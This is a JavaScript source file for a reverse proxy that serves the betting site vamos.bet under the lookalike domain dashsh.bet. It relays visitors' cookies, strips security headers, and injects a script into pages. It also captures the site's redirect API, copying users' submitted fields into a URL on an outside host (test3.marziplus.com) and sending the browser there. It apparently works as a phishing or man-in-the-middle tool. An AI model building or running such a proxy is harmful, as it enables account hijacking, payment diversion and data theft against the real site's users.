import http from "node:http";
import https from "node:https";
import crypto from "node:crypto";
import { execFile } from "node:child_process";
import { promisify } from "node:util";

const execFileAsync = promisify(execFile);

/*
 * ==========================================
 * CONFIGURATION
 * ==========================================
 */

const PROXY_HOST = "127.0.0.1";
const PROXY_PORT = 6005;
const PROXY_PUBLIC_DOMAIN = "dashsh.bet";
const TARGET_BASE_DOMAIN = "vamos.bet";

const REDIRECT_API_PATH = "/api/v9/test/redirect";
const REDIRECT_BASE_URL = "https://test3.marziplus.com";
const REDIRECT_TTL_MS = 30_000;

const CURL_CHROME_BIN = "/usr/local/bin/curl-chrome";
const clients = new Map();

/*
 * ==========================================
 * SESSION & COOKIE MANAGEMENT
 * ==========================================
 */

const getOrCreateClient = (req, res) => {
  const cookieHeader = req.headers.cookie || "";
  const match = cookieHeader.match(/(?:^|;\s*)proxy_client_id=([^;]+)/);
  let id = match ? match[1] : null;

  if (!id) {
    id = crypto.randomUUID();
    res.setHeader(
      "Set-Cookie",
      `proxy_client_id=${id}; Path=/; HttpOnly; SameSite=Lax`
    );
  }

  if (!clients.has(id)) {
    clients.set(id, {
      redirected: false,
      redirectUrl: null,
      createdAt: Date.now()
    });
  }

  return id;
};

setInterval(() => {
  const now = Date.now();
  for (const [id, state] of clients.entries()) {
    if (now - state.createdAt > REDIRECT_TTL_MS) {
      clients.delete(id);
    }
  }
}, 10_000);

/*
 * ==========================================
 * HTML SCRIPT INJECTION
 * ==========================================
 */

const injectWatcher = (html) => {
  const script = `
<script>
(function () {
  function checkProxyRedirect() {
    try {
      var xhr = new XMLHttpRequest();
      xhr.open("GET", "/__proxy_redirect_status", true);
      xhr.setRequestHeader("Cache-Control", "no-store");
      xhr.onreadystatechange = function () {
        if (xhr.readyState === 4 && xhr.status === 200) {
          try {
            var data = JSON.parse(xhr.responseText);
            if (data.redirect && data.url) {
              window.location.replace(data.url);
            }
          } catch (e) {}
        }
      };
      xhr.send();
    } catch (e) {}
  }
  setInterval(checkProxyRedirect, 300);
  checkProxyRedirect();
})();
</script>
`;
  return html.includes("</body>")
    ? html.replace("</body>", `${script}</body>`)
    : html + script;
};

/*
 * ==========================================
 * NATIVE STREAM PROXY FOR STATIC ASSETS (PNG, JPG, FONT, CSS)
 * ==========================================
 */

const proxyStaticAssetNative = (clientReq, clientRes, targetHostname) => {
  const options = {
    hostname: targetHostname,
    port: 443,
    path: clientReq.url,
    method: clientReq.method,
    headers: {
      ...clientReq.headers,
      host: targetHostname,
      referer: `https://${targetHostname}${clientReq.url}`,
      origin: `https://${targetHostname}`,
      "accept-encoding": "identity" // Disable compression to pass raw bytes cleanly
    }
  };

  const proxyReq = https.request(options, (upstreamRes) => {
    const headers = { ...upstreamRes.headers };

    delete headers["content-security-policy"];
    delete headers["x-frame-options"];

    clientRes.writeHead(upstreamRes.statusCode, headers);
    upstreamRes.pipe(clientRes);
  });

  proxyReq.on("error", (err) => {
    console.error(`❌ Native Stream Error [${clientReq.url}]:`, err.message);
    if (!clientRes.headersSent) {
      clientRes.writeHead(502);
      clientRes.end("Proxy Asset Error");
    }
  });

  clientReq.pipe(proxyReq);
};

/*
 * ==========================================
 * FORWARD DYNAMIC/HTML REQUESTS VIA CURL-CHROME
 * ==========================================
 */

const forwardRequest = async (clientReq, clientRes, bodyBuffer = null) => {
  try {
    let finalBody = bodyBuffer;
    if (finalBody === null) {
      const chunks = [];
      for await (const chunk of clientReq) {
        chunks.push(chunk);
      }
      finalBody = Buffer.concat(chunks);
    }

    const incomingHost = clientReq.headers.host || PROXY_PUBLIC_DOMAIN;
    const targetHostname = incomingHost.replace(
      new RegExp(PROXY_PUBLIC_DOMAIN, "gi"),
      TARGET_BASE_DOMAIN
    );

    const targetUrl = `https://${targetHostname}${clientReq.url}`;

    const args = [
      "-s", "-i",
      "-X", clientReq.method,
      targetUrl,
      "-H", `Host: ${targetHostname}`,
      "-H", `User-Agent: ${clientReq.headers["user-agent"] || "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0.0.0 Safari/537.36"}`,
      "-H", `Accept: ${clientReq.headers["accept"] || "*/*"}`,
      "-H", `Accept-Language: ${clientReq.headers["accept-language"] || "en-US,en;q=0.9"}`
    ];

    if (clientReq.headers["content-type"]) {
      args.push("-H", `Content-Type: ${clientReq.headers["content-type"]}`);
    }

    if (clientReq.headers.cookie) {
      args.push("-H", `Cookie: ${clientReq.headers.cookie}`);
    }

    if (finalBody.length > 0 && !["GET", "HEAD"].includes(clientReq.method)) {
      args.push("--data-binary", finalBody.toString("utf8"));
    }

    const { stdout } = await execFileAsync(CURL_CHROME_BIN, args, {
      maxBuffer: 100 * 1024 * 1024,
      encoding: "buffer"
    });

    let headerEndIndex = stdout.indexOf(Buffer.from("\r\n\r\n"));
    let delimiterLength = 4;

    if (headerEndIndex === -1) {
      headerEndIndex = stdout.indexOf(Buffer.from("\n\n"));
      delimiterLength = 2;
    }

    if (headerEndIndex === -1) {
      throw new Error("Invalid HTTP response format from upstream.");
    }

    const rawHeadersBuffer = stdout.subarray(0, headerEndIndex);
    const responseBodyBuffer = stdout.subarray(headerEndIndex + delimiterLength);

    const rawHeadersText = rawHeadersBuffer.toString("latin1");
    const headerLines = rawHeadersText.split(/\r?\n/);
    const statusLine = headerLines.shift();
    const statusCode = parseInt(statusLine.split(" ")[1], 10) || 200;

    const headers = {};
    for (const line of headerLines) {
      const parts = line.split(":");
      const key = parts.shift();
      const value = parts.join(":");
      if (key && value) {
        headers[key.trim().toLowerCase()] = value.trim();
      }
    }

    delete headers["content-security-policy"];
    delete headers["content-security-policy-report-only"];
    delete headers["x-frame-options"];
    delete headers["transfer-encoding"];
    delete headers["content-encoding"];
    delete headers["content-length"];

    if (headers.location) {
      headers.location = headers.location.replace(
        new RegExp(`https?://${targetHostname}`, "gi"),
        `https://${incomingHost}`
      );
    }

    let html = responseBodyBuffer.toString("utf8");

    if (html.includes("<head>")) {
      html = html.replace("<head>", `<head><base href="https://${incomingHost}/">`);
    }

    html = injectWatcher(html);
    const newBody = Buffer.from(html, "utf8");

    headers["content-length"] = newBody.length;
    clientRes.writeHead(statusCode, headers);
    return clientRes.end(newBody);
  } catch (error) {
    console.error(`❌ Upstream Request Error:`, error.message);
    if (!clientRes.headersSent) {
      clientRes.writeHead(502, { "Content-Type": "text/html; charset=utf-8" });
    }
    clientRes.end(`<h1>502 Bad Gateway</h1><p>Proxy error: ${error.message}</p>`);
  }
};

/*
 * ==========================================
 * MAIN HTTP SERVER
 * ==========================================
 */

const server = http.createServer(async (clientReq, clientRes) => {
  const parsedUrl = new URL(
    clientReq.url,
    `http://${clientReq.headers.host || "localhost"}`
  );
  const path = parsedUrl.pathname;
  const clientId = getOrCreateClient(clientReq, clientRes);
  const state = clients.get(clientId);

  // 1. Redirect Check Route
  if (clientReq.method === "GET" && path === "/__proxy_redirect_status") {
    const response = JSON.stringify({
      redirect: Boolean(state?.redirected),
      url: state?.redirectUrl || null
    });

    clientRes.writeHead(200, {
      "Content-Type": "application/json; charset=utf-8",
      "Cache-Control": "no-store",
      "Content-Length": Buffer.byteLength(response)
    });
    return clientRes.end(response);
  }

  // 2. Ignore CF Telemetry
  if (path.startsWith("/cdn-cgi/")) {
    clientRes.writeHead(204);
    return clientRes.end();
  }

  // 3. Handle Special Redirect API
  if (path === REDIRECT_API_PATH) {
    const chunks = [];
    for await (const chunk of clientReq) {
      chunks.push(chunk);
    }
    const body = Buffer.concat(chunks);

    if (body.length === 0) {
      return forwardRequest(clientReq, clientRes, body);
    }

    try {
      const json = JSON.parse(body.toString("utf8"));
      const redirectUrl = new URL(REDIRECT_BASE_URL);
      for (const [key, val] of Object.entries(json)) {
        if (val !== undefined && val !== null) {
          redirectUrl.searchParams.set(key, String(val));
        }
      }

      const finalUrl = redirectUrl.toString();

      if (state) {
        state.redirected = true;
        state.redirectUrl = finalUrl;
        state.createdAt = Date.now();
      }

      const response = JSON.stringify({ success: true, proxyRedirect: true });
      clientRes.writeHead(200, {
        "Content-Type": "application/json; charset=utf-8",
        "Cache-Control": "no-store",
        "Content-Length": Buffer.byteLength(response)
      });
      clientRes.end(response);
      return;
    } catch (err) {
      return forwardRequest(clientReq, clientRes, body);
    }
  }

  if (state?.redirected) {
    clientRes.writeHead(410, { "Content-Type": "text/plain; charset=utf-8" });
    return clientRes.end("Proxy session terminated");
  }

  // 4. ROUTER: Pass static assets directly through HTTPS streaming, bypass curl-chrome entirely
  const isStaticAsset = path.match(/\.(png|jpg|jpeg|gif|svg|webp|woff|woff2|ttf|ico|css|js)(\?.*)?$/i);
  
  const incomingHost = clientReq.headers.host || PROXY_PUBLIC_DOMAIN;
  const targetHostname = incomingHost.replace(
    new RegExp(PROXY_PUBLIC_DOMAIN, "gi"),
    TARGET_BASE_DOMAIN
  );

  if (isStaticAsset) {
    return proxyStaticAssetNative(clientReq, clientRes, targetHostname);
  }

  // 5. Use curl-chrome only for dynamic HTML pages
  await forwardRequest(clientReq, clientRes, null);
});

server.on("clientError", (error, socket) => {
  socket.end("HTTP/1.1 400 Bad Request\r\n\r\n");
});

server.listen(PROXY_PORT, PROXY_HOST, () => {
  console.log(`==========================================`);
  console.log(` Proxy listening on http://${PROXY_HOST}:${PROXY_PORT}`);
  console.log(` Static Assets: Native Stream | Dynamic: curl-chrome`);
  console.log(`==========================================`);
});